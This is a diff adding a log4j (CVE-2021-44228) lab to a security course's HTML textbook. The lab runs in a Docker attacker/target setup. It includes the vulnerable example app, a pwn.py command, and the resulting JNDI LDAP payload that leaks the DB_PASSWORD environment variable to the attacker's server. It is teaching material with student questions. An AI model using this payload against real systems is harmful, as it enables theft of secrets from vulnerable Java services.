@@ -1819,11 +1819,11 @@ Whaling is often used in conjunction with spear phishing.</p>
 </dd>
 <dt class="hdlist1">Smishing</dt>
 <dd>
-<p>Using SMS messages to phish for access.</p>
+<p>Using SMS messages when phishing.</p>
 </dd>
 <dt class="hdlist1">Vishing</dt>
 <dd>
-<p>Using voice messages to phish for access.</p>
+<p>Using voice messages when phishing.</p>
 </dd>
 <dt class="hdlist1">Phishing sites</dt>
 <dd>
@@ -3518,6 +3518,228 @@ Take a look at the output from the terminal running <code>docker-compose up</cod
 </div>
 <div class="paragraph">
 <p>To stop the running containers, you can type Ctrl-C in the terminal running <code>docker-compose up</code>, exit out of the victim, and exit out of the attacker.</p>
+</div>
+</div>
+</div>
+<div class="openblock lab">
+<div class="title">Exploiting log4j</div>
+<div class="content">
+<div class="paragraph">
+<p>In this lab we will examine the log4j vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a>.
+This vulnerability takes advantage of a flaw in a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft.
+Any attacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the target to reach out to another server, LDAP in our example, and load a remote Java class file.
+This file can contain any code that the attacker wishes to inject into the server process.</p>
+</div>
+<div class="admonitionblock important deliverable">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-important" title="Important"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>Do some research: What versions of log4j are affected by this vulnerability?</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>This lab uses a Docker Compose configuration to simulate a network with an attacker and a target.
+The target runs a <a href="https://github.com/leonjza/log4jpwn">known-vulnerable, example application</a> written by leonjza.
+This example application logs the <code>User-Agent</code> header, request path, and a query string parameter of a request as seen below:</p>
+</div>
+<div class="listingblock">
+<div class="title">App.java</div>
+<div class="content">
+<pre class="highlight"><code class="language-java" data-lang="java">package com.sensepost.log4jpwn;
+
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+
+import static spark.Spark.*;
+
+public class App {
+    static final Logger logger = LogManager.getLogger(App.class.getName());
+
+    public static void main(String[] args) {
+
+        port(8080);
+
+        get("/*", (req, res) -&gt; {
+
+            String ua = req.headers("User-Agent");
+            String pwn = req.queryParams("pwn");
+            String pth = req.pathInfo();
+
+            System.out.println("logging ua: " + ua);
+            System.out.println("logging pwn: " + pwn);
+            System.out.println("logging pth: " + pth);
+
+            // trigger
+            logger.error(ua);
+            logger.error(pwn);
+            logger.error(pth);
+
+            return "ok: ua: " + ua + " " + "pwn: " + pwn + " pth:" + pth;
+        });
+    }
+}</code></pre>
+</div>
+</div>
+<div class="admonitionblock important deliverable">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-important" title="Important"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>What port does our vulnerable app run on?</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Our attacker container has <a href="https://github.com/leonjza/log4jpwn/blob/master/pwn.py">the <code>pwn.py</code> script</a>, also by leonjza, which does two things:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Runs a fake LDAP server in the background on port 8888</p>
+</li>
+<li>
+<p>Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak</p>
+</li>
+<li>
+<p>Parses and prints the response</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>Using this setup we can show how log4j can be used to leak sensitive information from running processes.
+We will use it to leak the value of the environment variable <code>DB_PASSWORD</code>.
+As it isn&#8217;t uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.</p>
+</div>
+<div class="paragraph">
+<p>Start by downloading the zip archive of this lab and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you&#8217;ve done that, you can bring the lab up by typing <code>docker-compose up</code> in that directory. Output should look similar to what you see below:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-console" data-lang="console">PS C:\Users\rxt1077\it230\labs\log4j&gt; docker-compose up
+[+] Running 2/0
+ - Container log4j-target-1    Created                                                            0.0s
+ - Container log4j-attacker-1  Created                                                            0.0s
+Attaching to log4j-attacker-1, log4j-target-1
+log4j-attacker-1 exited with code 0
+log4j-target-1    | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog
+log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
+log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - &gt;&gt; Listening on 0.0.0.0:8080
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>You&#8217;ll notice that the <code>target</code> service is up and running the <code>log4jpwn</code> example application and that its output goes straight to the screen.
+The <code>attacker</code> service will exit immediately as it is meant for interactive use and doesn&#8217;t run anything in the background.
+In another terminal, navigate to the lab directory again and run <code>docker-compose run attacker bash</code>. This will be the shell that you use to attack the target:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-console" data-lang="console">PS C:\Users\rxt1077\it230\labs\log4j&gt; docker-compose run attacker bash
+root@3971c61303c8:/<i class="conum" data-value="1"></i><b>(1)</b></code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>Notice how the prompt changes once we are in the container</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>In the attack shell, use the <code>ip</code> command to determine the IPv4 address of your container.
+We will need this since the <code>attacker</code> container will be listening for connections from <code>target</code> once the exploit string is logged.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-console" data-lang="console">root@3971c61303c8:/# ip addr show dev eth0
+58: eth0@if59: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet &lt;IP_ADDRESS&gt;/16 brd 172.20.255.255 scope global eth0 <i class="conum" data-value="1"></i><b>(1)</b>
+       valid_lft forever preferred_lft forever</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>You&#8217;re IP is <em>not</em> <code>&lt;IP_ADDRESS&gt;</code> it is whatever you find in its place!</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Once you have the IP address, you can run the <code>pwn.py</code> script on the <code>attacker</code> container and you should be able to read the <code>DB_PASSWORD</code> environment variable on the <code>target</code> container.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-console" data-lang="console">root@3971c61303c8:/# python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt; --target http://target:8080 --leak '${env:DB_PASSWORD}' <i class="conum" data-value="1"></i><b>(1)</b>
+ i| starting server on &lt;IP_ADDRESS&gt;:8888
+ i| server started
+ i| setting payload in User-Agent header
+ i| sending exploit payload ${jndi:ldap://&lt;IP_ADDRESS&gt;:8888/${env:DB_PASSWORD}} to http://target:8080/
+ i| new connection from &lt;TARGETS_IP&gt;:44050
+ v| extracted value: &lt;DB_PASSWORD&gt; <i class="conum" data-value="2"></i><b>(2)</b>
+ i| request url was: http://target:8080/
+ i| response status code: 200</code></pre>
+</div>
+</div>
+<div class="colist arabic">
+<table>
+<tr>
+<td><i class="conum" data-value="1"></i><b>1</b></td>
+<td>Docker Compose will resolve service names to IP addresses so the target URI doesn&#8217;t require finding an IP</td>
+</tr>
+<tr>
+<td><i class="conum" data-value="2"></i><b>2</b></td>
+<td>The value of <code>DB_PASSWORD</code> can will be here.</td>
+</tr>
+</table>
+</div>
+<div class="admonitionblock important deliverable">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-important" title="Important"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>What is the database password?</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="admonitionblock important deliverable">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-important" title="Important"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>What steps would you take to mitigate the risk of a deployed application having this vulnerability?</p>
+</div>
+</td>
+</tr>
+</table>
 </div>
 </div>
 </div>
